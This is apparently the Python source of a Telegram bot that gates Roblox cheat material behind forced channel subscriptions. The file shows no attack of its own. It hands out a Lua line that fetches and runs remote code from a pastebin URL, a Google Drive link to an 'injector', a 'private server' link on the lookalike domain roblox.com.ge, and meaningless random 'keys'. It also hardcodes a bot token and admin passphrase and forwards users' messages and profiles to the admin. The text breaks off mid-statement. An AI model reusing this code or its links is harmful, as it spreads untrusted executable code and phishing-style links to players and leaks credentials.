import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread

TOKEN = os.environ.get("TOKEN", "8793302361:AAHCxbHJ6v_oCyjHqiafsHHaf7Xr1EvkDO8")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')")
    conn.commit()
    conn.close()

def add_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        c.execute("INSERT INTO users (user_id, lang) VALUES (?, 'ru')", (user_id,))
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False

def set_lang(user_id, lang):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_lang(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else 'ru'

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id, lang FROM users")
    users = [(row[0], row[1]) for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

def remove_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

LANG = {
    "ru": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!",
        "not_subscribed": "📢 Подпишитесь на каналы для получения скрипта и ключа",
        "check_sub_btn": "🔍 Проверить подписку",
        "check_again_btn": "🔍 Проверить снова",
        "sub_btn": "Подписаться ✅",
        "unsub_btn": "Подписаться ❎",
        "success_check": "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:",
        "not_all_subs": "❌ Осталось подписаться:",
        "script_btn": "📜 Скрипт на все игры",
        "key_btn": "🔑 Ключ",
        "private_btn": "🔒 Приватный сервер MM2",
        "delta_btn": "📥 Скачать инжектор (Delta)",
        "script_text": "📜 Скрипт на все игры:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Твой ключ:\n\n`{key}`\n\nСкопируй и вставь в скрипт.",
        "private_text": "🔒 Приватный сервер MM2\n\n{link}",
        "delta_text": "📥 Скачать Delta Injector:\n\n{link}",
        "new_user": "🆕 Новый пользователь!\n\n🆔 ID: `{uid}`\n👤 Имя: {name}\n📛 Username: @{uname}\n👥 Всего пользователей: {count}",
        "msg_to_admin": "💬 Новое сообщение в боте\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Сообщение: {msg}",
    },
    "en": {
        "lang_select": "Выберите язык / Choose language",
        "start": "😌 To continue using the bot, please complete the following tasks!",
        "not_subscribed": "📢 Subscribe to the channels to get the script and key",
        "check_sub_btn": "🔍 Check subscription",
        "check_again_btn": "🔍 Check again",
        "sub_btn": "Subscribe ✅",
        "unsub_btn": "Subscribe ❎",
        "success_check": "✅ Subscription confirmed!\n\nChoose what you want to get:",
        "not_all_subs": "❌ Still need to subscribe:",
        "script_btn": "📜 Script for all games",
        "key_btn": "🔑 Key",
        "private_btn": "🔒 Private server MM2",
        "delta_btn": "📥 Download Injector (Delta)",
        "script_text": "📜 Script for all games:\n\n```lua\n{script}\n```",
        "key_text": "🔑 Your key:\n\n`{key}`\n\nCopy and paste into the script.",
        "private_text": "🔒 Private server MM2\n\n{link}",
        "delta_text": "📥 Download Delta Injector:\n\n{link}",
        "new_user": "🆕 New user!\n\n🆔 ID: `{uid}`\n👤 Name: {name}\n📛 Username: @{uname}\n👥 Total users: {count}",
        "msg_to_admin": "💬 New message in bot\n\n👤 {name}\n📛 @{uname}\n🆔 `{uid}`\n\n📩 Message: {msg}",
    }
}

MESSAGES = {"broadcast_text": ""}
PHOTOS = {"start": None}

bot = telebot.TeleBot(TOKEN)

def t(user_id, key, **kwargs):
    lang = get_lang(user_id)
    text = LANG.get(lang, LANG["ru"]).get(key, key)
    return text.format(**kwargs)

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_lang_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru"),
        types.InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")
    )
    return keyboard

def get_channels_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(
            text=f"{t(user_id, 'sub_btn')} {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "check_sub_btn"),
        callback_data="check_sub"
    ))
    return keyboard

def get_unsub_keyboard(not_subbed, user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(
            text=f"{t(user_id, 'unsub_btn')} {ch['name']}",
            url=ch['url']
        ))
    keyboard.add(types.InlineKeyboardButton(
        text=t(user_id, "check_again_btn"),
        callback_data="check_sub"
    ))
    return keyboard

def get_success_keyboard(user_id):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "script_btn"), callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "key_btn"), callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "private_btn"), callback_data="get_private"))
    keyboard.add(types.InlineKeyboardButton(text=t(user_id, "delta_btn"), url=DELTA_LINK))
    return keyboard

def get_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("📝 Приветствие", callback_data="admin_edit_start"),
        types.InlineKeyboardButton("📢 Не подписан", callback_data="admin_edit_notsub")
    )
    keyboard.add(
        types.InlineKeyboardButton("🖼 Фото старт", callback_data="admin_photo_start"),
        types.InlineKeyboardButton("➕ Канал", callback_data="admin_add_channel")
    )
    keyboard.add(
        types.InlineKeyboardButton("➖ Канал", callback_data="admin_del_channel"),
        types.InlineKeyboardButton("📋 Каналы", callback_data="admin_list_channels")
    )
    keyboard.add(
        types.InlineKeyboardButton("🔑 Ключи", callback_data="admin_list_keys"),
        types.InlineKeyboardButton("🔑 Изменить ключи", callback_data="admin_edit_keys")
    )
    keyboard.add(
        types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast"),
        types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    )
    keyboard.add(
        types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list"),
        types.InlineKeyboardButton("🚫 Удалить юзера", callback_data="admin_del_user")
    )
    keyboard.add(
        types.InlineKeyboardButton("📨 Личное сообщение", callback_data="admin_pm"),
        types.InlineKeyboardButton("🔗 Изменить прив.", callback_data="admin_edit_link")
    )
    keyboard.add(
        types.InlineKeyboardButton("📜 Изменить скрипт", callback_data="admin_edit_script"),
        types.InlineKeyboardButton("📥 Изменить Delta", callback_data="admin_edit_delta")
    )
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    add_user(message.from_user.id)
    bot.send_message(message.chat.id, LANG["ru"]["lang_select"], reply_markup=get_lang_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def lang_callback(call):
    lang = call.data.replace("lang_", "")
    set_lang(call.from_user.id, lang)
    user = call.from_user
    text = t(call.from_user.id, "new_user", uid=user.id, name=user.first_name, uname=user.username or "нет", count=count_users())
    notify_admin(text)
    if PHOTOS["start"]:
        bot.send_photo(call.message.chat.id, PHOTOS["start"], caption=t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    else:
        bot.send_message(call.message.chat.id, t(call.from_user.id, "start"), reply_markup=get_channels_keyboard(call.from_user.id))
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: not m.text.startswith("/") and m.text != ADMIN_SECRET and m.from_user.id != ADMIN_ID)
def catch_messages(message):
    user = message.from_user
    text = t(ADMIN_ID, "msg_to_admin", name=user.first_name, uname=user.username or "нет", uid=user.id, msg=message.text)
    notify_admin(text)

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        key = random.choice(KEYS)
        bot.send_message(message.chat.id, t(message.from_user.id, "key_text", key=key), parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, t(message.from_user.id, "not_subscribed"), reply_markup=get_unsub_keyboard(not_subbed, message.from_user.id))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    text = f"🛡 *Админ панель*\n\n👥 Пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}\n\nВыбери действие:"
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=get_admin_keyboard())

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callback(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа.")
        return
    action = call.data
    
    if action == "admin_stats":
        text = f"📊 *Статистика:*\n👥 Всего пользователей: {count_users()}\n📊 Каналов: {len(CHANNELS)}\n🔑 Ключей: {len(KEYS)}"
        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    
    elif action == "admin_users_list":
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id
